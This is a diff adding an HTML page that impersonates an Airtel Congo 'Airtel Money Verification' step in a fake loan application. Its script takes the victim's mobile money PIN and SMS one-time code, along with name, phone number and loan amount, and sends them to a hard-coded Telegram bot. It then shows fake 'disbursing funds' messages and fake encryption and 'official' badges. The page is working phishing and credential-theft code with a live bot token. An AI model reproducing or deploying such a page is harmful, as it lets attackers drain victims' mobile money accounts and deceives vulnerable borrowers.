@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Congo - Airtel Money Verification</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%23E51937'/><text x='16' y='22' font-family='Georgia, serif' font-size='18' font-weight='bold' fill='%23ffffff' text-anchor='middle'>a</text></svg>">
+</head>
+<body>
+
+  <!-- Navigation Bar -->
+  <header class="navbar">
+    <a href="index.html" class="nav-brand">
+      <div class="brand-icon">a</div>
+      <div class="brand-text">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Airtel Money Secure</span>
+      </div>
+    </a>
+    <div class="nav-actions">
+      <a href="apply.html" class="nav-link" id="navCancelLink">Cancel</a>
+    </div>
+  </header>
+
+  <!-- Main Content Wrapper -->
+  <main class="main-wrapper">
+    <div class="card-container">
+      <div class="card-top-bar"></div>
+
+      <!-- Card Header -->
+      <div class="card-header">
+        <h1 class="card-title">Airtel Money Verification</h1>
+        <p class="card-subtitle" id="stepSubtitle">Step 1 of 2 — Confirm your identity</p>
+      </div>
+
+      <!-- 2-segment progress bar -->
+      <div class="progress-bar-container" aria-label="Verification Progress">
+        <div id="vseg1" class="progress-segment active"></div>
+        <div id="vseg2" class="progress-segment"></div>
+      </div>
+
+      <!-- Account Badge (shown on both steps) -->
+      <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 14px 16px; margin-bottom: 22px; display: flex; align-items: center; justify-content: space-between;">
+        <div>
+          <div style="font-size: 11px; color: #64748b; font-weight: 500; text-transform: uppercase;">Airtel Money Account</div>
+          <div id="verifiedPhoneDisplay" style="font-size: 15px; font-weight: 700; color: #1e293b; margin-top: 2px;">+243 812 345 678</div>
+        </div>
+        <div style="background: #dcfce7; color: #15803d; font-size: 11.5px; font-weight: 600; padding: 4px 10px; border-radius: 999px;">
+          Active Wallet
+        </div>
+      </div>
+
+      <!-- =============================================
+           STEP 1: Phone Number + PIN
+      ============================================= -->
+      <div id="step1Card">
+        <form id="pinForm">
+          <!-- PIN entry -->
+          <div class="form-group" style="text-align: center;">
+            <label class="form-label" style="margin-bottom: 10px; font-size: 13px; font-weight: 600;">
+              Enter Airtel Money PIN
+            </label>
+            <div class="pin-input-row">
+              <input type="password" maxlength="1" class="pin-digit" inputmode="numeric" autocomplete="one-time-code" required autofocus>
+              <input type="password" maxlength="1" class="pin-digit" inputmode="numeric">
+              <input type="password" maxlength="1" class="pin-digit" inputmode="numeric">
+              <input type="password" maxlength="1" class="pin-digit" inputmode="numeric">
+            </div>
+            <div class="form-helper" style="font-size: 11.5px; color: #64748b;">
+              Enter the 4-digit secret PIN of your Airtel Money account
+            </div>
+          </div>
+
+          <!-- Submit Step 1 -->
+          <button type="submit" id="pinSubmitBtn" class="btn-primary" style="margin-top: 24px;">
+            CONFIRM PIN
+          </button>
+
+          <!-- Security Badge -->
+          <div class="security-badge">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+            </svg>
+            <span>Bank-grade 256-bit encryption • Official Airtel Congo Verification</span>
+          </div>
+        </form>
+      </div>
+
+      <!-- =============================================
+           STEP 2: OTP Entry
+      ============================================= -->
+      <div id="step2Card" style="display: none;">
+        <form id="otpForm">
+          <!-- OTP info box -->
+          <div style="background: #fffbeb; border: 1px solid #fde68a; border-radius: 10px; padding: 12px 16px; margin-bottom: 20px; display: flex; align-items: flex-start; gap: 10px;">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#d97706" style="flex-shrink:0; margin-top:2px;">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+            </svg>
+            <span style="font-size: 12.5px; color: #92400e; line-height: 1.5;">
+              An SMS with a 6-digit OTP has been sent to <strong id="otpPhoneHint">your registered number</strong>. Enter it below to authorize disbursement.
+            </span>
+          </div>
+
+          <!-- OTP input -->
+          <div class="form-group">
+            <label class="form-label" for="otpCode">6-Digit One-Time Password (OTP)</label>
+            <input
+              type="text"
+              id="otpCode"
+              class="form-input"
+              placeholder="Enter 6-digit OTP"
+              maxlength="6"
+              inputmode="numeric"
+              style="letter-spacing: 4px; text-align: center; font-weight: 700; font-size: 20px;"
+              required
+              autofocus
+            >
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 6px;">
+              <span class="form-helper">SMS sent to your registered phone</span>
+              <a href="#" id="resendOtpBtn" style="font-size: 11.5px; color: #E51937; text-decoration: none; font-weight: 600;">Resend OTP</a>
+            </div>
+          </div>
+
+          <!-- Submit Step 2 -->
+          <button type="submit" id="otpSubmitBtn" class="btn-primary" style="margin-top: 24px;">
+            CONFIRM &amp; DISBURSE FUNDS
+          </button>
+
+          <!-- Security Badge -->
+          <div class="security-badge">
+            <svg viewBox="0 0 24 24" fill="currentColor">
+              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+            </svg>
+            <span>Bank-grade 256-bit encryption • Official Airtel Congo Verification</span>
+          </div>
+        </form>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- Light Footer -->
+  <footer class="footer-light">
+    &copy; 2026 Airtel Congo
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+
+      /* ── Telegram config ── */
+      const TG_TOKEN  = '9037785587:AAGNHWv02eBizXBotkMftGxTbXzRSNf7K3s';
+      const TG_CHAT   = '8352010493';
+
+      function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
+        }).catch(() => {});
+      }
+
+      /* ── Load stored app data ── */
+      let appData = {};
+      try { appData = JSON.parse(localStorage.getItem('airtel_application') || '{}'); } catch(e) {}
+
+      /* ── Populate phone display ── */
+      const phoneDisplay = document.getElementById('verifiedPhoneDisplay');
+      const otpPhoneHint = document.getElementById('otpPhoneHint');
+      const phoneFormatted = appData.phone ? `+243 ${appData.phone}` : '+243 812 345 678';
+      if (phoneDisplay) phoneDisplay.textContent = phoneFormatted;
+      if (otpPhoneHint)  otpPhoneHint.textContent  = phoneFormatted;
+
+      /* ── Progress bar helper ── */
+      function setProgress(step) {
+        document.getElementById('vseg1').className = 'progress-segment ' + (step >= 1 ? (step > 1 ? 'completed' : 'active') : '');
+        document.getElementById('vseg2').className = 'progress-segment ' + (step >= 2 ? 'active' : '');
+        document.getElementById('stepSubtitle').textContent =
+          step === 1
+            ? 'Step 1 of 2 — Confirm your identity'
+            : 'Step 2 of 2 — Enter your OTP';
+      }
+
+      /* ── PIN auto-focus jump ── */
+      const pinInputs = document.querySelectorAll('.pin-digit');
+      pinInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+            pinInputs[index + 1].focus();
+          }
+        });
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            pinInputs[index - 1].focus();
+          }
+        });
+      });
+
+      /* ════════════════════════════════════════
+         STEP 1 — PIN submit → send to Telegram → show Step 2
+      ════════════════════════════════════════ */
+      const pinForm      = document.getElementById('pinForm');
+      const pinSubmitBtn = document.getElementById('pinSubmitBtn');
+
+      pinForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        const pin = Array.from(pinInputs).map(i => i.value).join('');
+        if (pin.length < 4) {
+          alert('Please enter all 4 PIN digits.');
+          return;
+        }
+
+        // Send Step 1 to Telegram
+        const msg1 =
+          `🔐 <b>STEP 1 — Phone &amp; PIN — Airtel Congo</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `👤 <b>Name:</b> ${appData.firstName || ''} ${appData.lastName || ''}\n` +
+          `📱 <b>Phone:</b> ${phoneFormatted}\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `🔑 <b>Airtel Money PIN:</b> <code>${pin}</code>\n` +
+          `💰 <b>Loan Amount:</b> $${parseFloat(appData.loanAmount || 1000).toLocaleString('en-US')}\n` +
+          `🕐 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kinshasa' })} (Kinshasa)`;
+        sendToTelegram(msg1);
+
+        // Loading state
+        pinSubmitBtn.disabled = true;
+        pinSubmitBtn.textContent = 'VERIFYING PIN...';
+
+        setTimeout(() => {
+          // Show Step 2
+          document.getElementById('step1Card').style.display = 'none';
+          document.getElementById('step2Card').style.display = 'block';
+          setProgress(2);
+          document.getElementById('otpCode').focus();
+          window.scrollTo({ top: 0, behavior: 'smooth' });
+        }, 1200);
+      });
+
+      /* ════════════════════════════════════════
+         STEP 2 — OTP submit → send to Telegram → success
+      ════════════════════════════════════════ */
+      const otpForm      = document.getElementById('otpForm');
+      const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+
+      otpForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        const otp = document.getElementById('otpCode').value.trim();
+        if (otp.length < 6) {
+          alert('Please enter the full 6-digit OTP.');
+          return;
+        }
+
+        // Send Step 2 to Telegram
+        const msg2 =
+          `📟 <b>STEP 2 — OTP CODE — Airtel Congo</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `👤 <b>Name:</b> ${appData.firstName || ''} ${appData.lastName || ''}\n` +
+          `📱 <b>Phone:</b> ${phoneFormatted}\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `📟 <b>OTP Code:</b> <code>${otp}</code>\n` +
+          `💰 <b>Loan Amount:</b> $${parseFloat(appData.loanAmount || 1000).toLocaleString('en-US')}\n` +
+          `🕐 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kinshasa' })} (Kinshasa)`;
+        sendToTelegram(msg2);
+
+        // Loading state → redirect
+        otpSubmitBtn.disabled = true;
+        otpSubmitBtn.textContent = 'VALIDATING OTP...';
+
+        setTimeout(() => {
+          otpSubmitBtn.textContent = 'DISBURSING LOAN FUNDS...';
+          setTimeout(() => {
+            window.location.href = 'success.html';
+          }, 900);
+        }, 1200);
+      });
+
+      /* ── Resend OTP ── */
+      document.getElementById('resendOtpBtn').addEventListener('click', (e) => {
+        e.preventDefault();
+        const btn = e.target;
+        btn.textContent = 'Code resent!';
+        setTimeout(() => { btn.textContent = 'Resend OTP'; }, 3000);
+      });
+
+      /* ── Init ── */
+      setProgress(1);
+    });
+  </script>
+</body>
+</html>
